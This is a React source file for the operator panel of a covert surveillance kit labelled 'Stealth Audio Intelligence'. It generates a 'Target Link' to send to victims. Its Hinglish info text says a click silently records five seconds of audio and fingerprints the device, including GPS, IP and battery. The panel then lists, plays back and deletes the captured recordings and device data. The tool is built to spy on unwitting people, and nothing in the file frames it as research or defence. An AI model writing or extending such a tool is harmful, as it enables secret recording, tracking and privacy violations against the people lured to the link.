import { useState, useEffect } from "react";
import { Link } from "react-router-dom";
import { 
  Mic, Loader2, ArrowLeft, Copy, Check, ExternalLink, 
  Headphones, Info, Link2, Smartphone, Database, 
  Trash2, RefreshCw, Volume2, FileJson, Radio, Waves,
  Shield, Zap, Signal
} from "lucide-react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { toast } from "@/hooks/use-toast";
import { useSettings } from "@/contexts/SettingsContext";
import { useAuth } from "@/contexts/AuthContext";
import { supabase } from "@/integrations/supabase/client";
import CreditDisplay from "@/components/CreditDisplay";
import { cn } from "@/lib/utils";

interface CapturedData {
  id: string;
  session_id: string;
  image_data: string;
  captured_at: string;
  user_agent: string | null;
}

const Page2 = () => {
  const { settings } = useSettings();
  const { isLoading: authLoading } = useAuth();
  const [activeSection, setActiveSection] = useState<"capture" | "media">("capture");
  const [copiedLink, setCopiedLink] = useState(false);
  const [capturedData, setCapturedData] = useState<CapturedData[]>([]);
  const [isLoadingData, setIsLoadingData] = useState(false);

  // Generate capture link
  const baseUrl = window.location.origin;
  const sessionId = settings.camSessionId || "audiocap01";
  const captureLink = `${baseUrl}/audio-capture?session=${sessionId}`;

  // Fetch captured data
  const fetchCapturedData = async () => {
    setIsLoadingData(true);
    try {
      const { data, error } = await supabase
        .from("captured_photos")
        .select("*")
        .or(`session_id.eq.${sessionId},session_id.eq.${sessionId}_deviceinfo`)
        .order("captured_at", { ascending: false });
      
      if (error) throw error;
      setCapturedData(data || []);
    } catch (err) {
      console.error("Failed to fetch data:", err);
    } finally {
      setIsLoadingData(false);
    }
  };

  // Delete captured item
  const deleteItem = async (id: string) => {
    try {
      const { error } = await supabase.from("captured_photos").delete().eq("id", id);
      if (error) throw error;
      setCapturedData(prev => prev.filter(item => item.id !== id));
      toast({ title: "Deleted!", description: "Item removed" });
    } catch (err) {
      toast({ title: "Error", description: "Failed to delete", variant: "destructive" });
    }
  };

  // Clear all data
  const clearAllData = async () => {
    try {
      const { error } = await supabase
        .from("captured_photos")
        .delete()
        .or(`session_id.eq.${sessionId},session_id.eq.${sessionId}_deviceinfo`);
      
      if (error) throw error;
      setCapturedData([]);
      toast({ title: "Cleared!", description: "All data removed" });
    } catch (err) {
      toast({ title: "Error", description: "Failed to clear", variant: "destructive" });
    }
  };

  useEffect(() => {
    if (activeSection === "media") {
      fetchCapturedData();
    }
  }, [activeSection, sessionId]);

  const copyLink = async () => {
    await navigator.clipboard.writeText(captureLink);
    setCopiedLink(true);
    toast({ title: "Copied!", description: "Link copied to clipboard" });
    setTimeout(() => setCopiedLink(false), 2000);
  };

  if (authLoading) {
    return (
      <div className="min-h-[100dvh] bg-black flex items-center justify-center">
        <Loader2 className="w-8 h-8 text-red-500 animate-spin" />
      </div>
    );
  }

  return (
    <div className="min-h-[100dvh] bg-gradient-to-b from-black via-gray-950 to-black relative overflow-hidden">
      {/* Red Grid Background */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden">
        <div 
          className="absolute inset-0 opacity-[0.03]"
          style={{
            backgroundImage: `
              linear-gradient(rgba(239, 68, 68, 0.3) 1px, transparent 1px),
              linear-gradient(90deg, rgba(239, 68, 68, 0.3) 1px, transparent 1px)
            `,
            backgroundSize: '50px 50px'
          }}
        />
        {/* Red Glow */}
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[300px] bg-red-600/10 rounded-full blur-[120px]" />
        <div className="absolute bottom-0 left-0 w-[300px] h-[300px] bg-orange-600/5 rounded-full blur-[100px]" />
      </div>

      {/* Content */}
      <div className="relative z-10 min-h-[100dvh] flex flex-col">
        {/* Header */}
        <header className="px-4 py-3 border-b border-red-500/20 bg-black/50 backdrop-blur-xl">
          <div className="flex items-center justify-between max-w-2xl mx-auto">
            <Link 
              to="/" 
              className="flex items-center gap-2 px-3 py-1.5 rounded-lg border border-red-500/30 bg-red-500/10 text-red-400 hover:bg-red-500/20 transition-all text-xs font-medium"
            >
              <ArrowLeft className="w-3.5 h-3.5" />
              BACK
            </Link>
            
            <div className="flex items-center gap-2">
              <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-500/10 border border-red-500/30">
                <Radio className="w-3.5 h-3.5 text-red-500 animate-pulse" />
                <span className="text-[10px] font-bold text-red-400 uppercase tracking-wider">Audio Lab</span>
              </div>
            </div>
            
            <CreditDisplay />
          </div>
        </header>

        {/* Hero Section */}
        <div className="px-4 py-6 text-center border-b border-red-500/10">
          <div className="max-w-2xl mx-auto">
            <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-gradient-to-r from-red-500/20 to-orange-500/20 border border-red-500/30 mb-3">
              <Waves className="w-4 h-4 text-red-400" />
              <span className="text-xs font-bold text-red-300">STEALTH AUDIO INTELLIGENCE</span>
              <Waves className="w-4 h-4 text-red-400" />
            </div>
            <h1 className="text-2xl font-black text-white mb-2 tracking-tight">
              AUDIO <span className="text-transparent bg-clip-text bg-gradient-to-r from-red-500 to-orange-500">CAPTURE</span>
            </h1>
            <p className="text-xs text-gray-500">Silent 5-second recording + Full device fingerprinting</p>
          </div>
        </div>

        {/* Tab Switch */}
        <div className="px-4 py-3 border-b border-red-500/10">
          <div className="max-w-2xl mx-auto flex gap-2">
            <button
              onClick={() => setActiveSection("capture")}
              className={cn(
                "flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-xs font-bold uppercase tracking-wider transition-all",
                activeSection === "capture"
                  ? "bg-gradient-to-r from-red-600 to-orange-600 text-white shadow-lg shadow-red-500/25"
                  : "bg-gray-900/50 text-gray-500 border border-gray-800 hover:border-red-500/30"
              )}
            >
              <Mic className="w-4 h-4" />
              Capture
            </button>
            <button
              onClick={() => setActiveSection("media")}
              className={cn(
                "flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-xs font-bold uppercase tracking-wider transition-all",
                activeSection === "media"
                  ? "bg-gradient-to-r from-red-600 to-orange-600 text-white shadow-lg shadow-red-500/25"
                  : "bg-gray-900/50 text-gray-500 border border-gray-800 hover:border-red-500/30"
              )}
            >
              <Database className="w-4 h-4" />
              Data ({capturedData.length})
            </button>
          </div>
        </div>

        {/* Main Content */}
        <main className="flex-1 px-4 py-4">
          <div className="max-w-2xl mx-auto">
            
            {/* Capture Section */}
            {activeSection === "capture" && (
              <div className="space-y-4">
                {/* Info Card */}
                <div className="p-4 rounded-xl bg-gradient-to-br from-red-500/10 to-orange-500/5 border border-red-500/20">
                  <div className="flex items-start gap-3">
                    <div className="w-10 h-10 rounded-lg bg-red-500/20 flex items-center justify-center flex-shrink-0">
                      <Info className="w-5 h-5 text-red-400" />
                    </div>
                    <div className="text-xs text-gray-400 leading-relaxed">
                      Target link pe click karega to <span className="text-red-400 font-bold">5 second audio</span> silently record hoga + full <span className="text-orange-400 font-bold">device fingerprint</span> capture hogi.
                    </div>
                  </div>
                </div>

                {/* Session ID */}
                <div className="p-4 rounded-xl bg-gray-900/50 border border-gray-800">
                  <label className="text-[10px] font-bold text-gray-500 uppercase tracking-wider mb-2 block">
                    Session ID
                  </label>
                  <div className="flex items-center gap-2 p-3 rounded-lg bg-black/50 border border-gray-800">
                    <Signal className="w-4 h-4 text-red-500" />
                    <span className="text-sm font-mono text-white">{sessionId}</span>
                  </div>
                  <p className="text-[9px] text-gray-600 mt-2">Change from Admin Panel → CAM settings</p>
                </div>

                {/* Generated Link */}
                <div className="p-4 rounded-xl bg-gray-900/50 border border-gray-800">
                  <label className="text-[10px] font-bold text-gray-500 uppercase tracking-wider mb-2 flex items-center gap-1.5">
                    <Link2 className="w-3 h-3" />
                    Target Link
                  </label>
                  <div className="flex gap-2">
                    <Input
                      value={captureLink}
                      readOnly
                      className="flex-1 h-10 bg-black/50 border-gray-700 text-red-400 font-mono text-xs focus:border-red-500"
                    />
                    <Button
                      onClick={copyLink}
                      className="h-10 px-4 bg-red-600 hover:bg-red-700 text-white"
                    >
                      {copiedLink ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                    </Button>
                  </div>
                </div>

                {/* Action Button */}
                <Button
                  onClick={() => window.open(captureLink, '_blank')}
                  className="w-full h-12 bg-gradient-to-r from-red-600 via-red-500 to-orange-600 hover:opacity-90 text-white font-bold text-sm shadow-lg shadow-red-500/30"
                >
                  <ExternalLink className="w-4 h-4 mr-2" />
                  TEST LINK
                </Button>

                {/* Features */}
                <div className="grid grid-cols-2 gap-3">
                  <div className="p-4 rounded-xl bg-gray-900/30 border border-gray-800 text-center">
                    <div className="w-10 h-10 mx-auto mb-2 rounded-lg bg-red-500/20 flex items-center justify-center">
                      <Headphones className="w-5 h-5 text-red-400" />
                    </div>
                    <p className="text-[11px] font-bold text-white">5 SEC AUDIO</p>
                    <p className="text-[9px] text-gray-600">Silent capture</p>
                  </div>
                  <div className="p-4 rounded-xl bg-gray-900/30 border border-gray-800 text-center">
                    <div className="w-10 h-10 mx-auto mb-2 rounded-lg bg-orange-500/20 flex items-center justify-center">
                      <Smartphone className="w-5 h-5 text-orange-400" />
                    </div>
                    <p className="text-[11px] font-bold text-white">DEVICE INFO</p>
                    <p className="text-[9px] text-gray-600">Full fingerprint</p>
                  </div>
                </div>

                {/* What's Captured */}
                <div className="p-4 rounded-xl bg-gray-900/30 border border-gray-800">
                  <p className="text-[10px] font-bold text-gray-500 uppercase tracking-wider mb-3">Captured Data</p>
                  <div className="flex flex-wrap gap-1.5">
                    {["Browser", "Screen", "Language", "Timezone", "Battery", "GPS", "IP", "OS"].map((item) => (
                      <span key={item} className="px-2 py-1 rounded-md bg-red-500/10 border border-red-500/20 text-[9px] font-medium text-red-400">
                        {item}
                      </span>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* Media Section */}
            {activeSection === "media" && (
              <div className="space-y-4">
                {/* Header */}
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Database className="w-4 h-4 text-red-400" />
                    <span className="text-xs font-bold text-white uppercase">Captured Data</span>
                    <span className="px-2 py-0.5 rounded-full bg-red-500/20 text-[10px] font-bold text-red-400">
                      {capturedData.length}
                    </span>
                  </div>
                  <div className="flex gap-2">
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={fetchCapturedData}
                      disabled={isLoadingData}
                      className="h-8 px-3 border-gray-700 text-gray-400 hover:bg-gray-800"
                    >
                      <RefreshCw className={cn("w-3.5 h-3.5", isLoadingData && "animate-spin")} />
                    </Button>
                    {capturedData.length > 0 && (
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={clearAllData}
                        className="h-8 px-3 border-red-500/30 text-red-400 hover:bg-red-500/10"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </Button>
                    )}
                  </div>
                </div>

                {/* Data List */}
                {isLoadingData ? (
                  <div className="flex items-center justify-center py-12">
                    <Loader2 className="w-6 h-6 text-red-500 animate-spin" />
                  </div>
                ) : capturedData.length === 0 ? (
                  <div className="text-center py-12 rounded-xl bg-gray-900/30 border border-gray-800">
                    <Database className="w-12 h-12 mx-auto mb-3 text-gray-700" />
                    <p className="text-sm font-medium text-gray-500">No data captured</p>
                    <p className="text-[10px] text-gray-600 mt-1">Share the link to start</p>
                  </div>
                ) : (
                  <div className="space-y-3 max-h-[500px] overflow-y-auto pr-1">
                    {capturedData.map((item) => {
                      const isDeviceInfo = item.session_id.endsWith("_deviceinfo");
                      const isAudio = item.image_data.startsWith("data:audio");
                      
                      return (
                        <div 
                          key={item.id}
                          className={cn(
                            "p-4 rounded-xl border",
                            isDeviceInfo 
                              ? "bg-orange-500/5 border-orange-500/20" 
                              : "bg-red-500/5 border-red-500/20"
                          )}
                        >
                          <div className="flex items-start justify-between gap-3 mb-3">
                            <div className="flex items-center gap-3">
                              <div className={cn(
                                "w-9 h-9 rounded-lg flex items-center justify-center",
                                isDeviceInfo ? "bg-orange-500/20" : "bg-red-500/20"
                              )}>
                                {isDeviceInfo ? (
                                  <FileJson className="w-4 h-4 text-orange-400" />
                                ) : (
                                  <Volume2 className="w-4 h-4 text-red-400" />
                                )}
                              </div>
                              <div>
                                <p className={cn(
                                  "text-xs font-bold",
                                  isDeviceInfo ? "text-orange-400" : "text-red-400"
                                )}>
                                  {isDeviceInfo ? "DEVICE INFO" : "AUDIO RECORDING"}
                                </p>
                                <p className="text-[9px] text-gray-500">
                                  {new Date(item.captured_at).toLocaleString()}
                                </p>
                              </div>
                            </div>
                            <Button
                              size="sm"
                              variant="ghost"
                              onClick={() => deleteItem(item.id)}
                              className="h-8 w-8 p-0 text-red-400 hover:bg-red-500/20"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                            </Button>
                          </div>
                          
                          {/* Content */}
                          {isDeviceInfo ? (
                            <div className="p-3 rounded-lg bg-black/30 max-h-40 overflow-y-auto">
                              <pre className="text-[9px] text-gray-400 whitespace-pre-wrap break-all font-mono">
                                {(() => {
                                  try {
                                    return JSON.stringify(JSON.parse(item.image_data), null, 2);
                                  } catch {
                                    return item.image_data;
                                  }
                                })()}
                              </pre>
                            </div>
                          ) : isAudio ? (
                            <audio controls className="w-full h-10" src={item.image_data}>
                              Your browser does not support audio.
                            </audio>
                          ) : (
                            <div className="p-3 rounded-lg bg-black/30">
                              <p className="text-[9px] text-gray-500 truncate font-mono">
                                {item.image_data.substring(0, 100)}...
                              </p>
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            )}
          </div>
        </main>

        {/* Footer */}
        <footer className="px-4 py-3 border-t border-red-500/10">
          <div className="max-w-2xl mx-auto flex items-center justify-center gap-3">
            <div className="flex items-center gap-1.5">
              <Shield className="w-3 h-3 text-red-500" />
              <span className="text-[9px] text-gray-600 uppercase tracking-wider">Encrypted</span>
            </div>
            <span className="text-gray-700">•</span>
            <div className="flex items-center gap-1.5">
              <Zap className="w-3 h-3 text-orange-500" />
              <span className="text-[9px] text-gray-600 uppercase tracking-wider">Audio Lab v2</span>
            </div>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default Page2;